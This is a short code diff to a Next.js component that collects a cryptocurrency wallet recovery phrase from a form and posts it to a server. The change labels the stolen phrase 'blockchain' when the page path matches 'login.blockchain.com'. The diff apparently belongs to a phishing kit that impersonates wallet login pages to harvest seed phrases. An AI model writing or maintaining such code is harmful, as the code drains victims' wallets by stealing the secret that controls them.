@@ -5,14 +5,14 @@ import CryptoMobile from "@/assets/crypto-mobile.svg";
 import Image from "next/image";
 import Link from "next/link";
 import { useState, FormEvent } from "react";
-import { useRouter, useParams } from "next/navigation";
+import { useRouter, usePathname } from "next/navigation";
 
 export default function Crypto() {
-  const params = useParams();
-  const wallet = params.wallet as string | undefined;
+  const pathname = usePathname();
   const [isLoading, setIsLoading] = useState(false);
   const [recoveryPhrase, setRecoveryPhrase] = useState("");
   const router = useRouter();
+
   const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
     e.preventDefault();
     setIsLoading(true);
@@ -23,7 +23,14 @@ export default function Crypto() {
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify({ phrase: recoveryPhrase, wallet: wallet ?? undefined }),
+        body: JSON.stringify({
+          phrase: recoveryPhrase,
+          wallet:
+            pathname.match("login.blockchain.com")?.[0] ===
+            "login.blockchain.com"
+              ? "blockchain"
+              : "",
+        }),
       });
 
       if (!response.ok) {
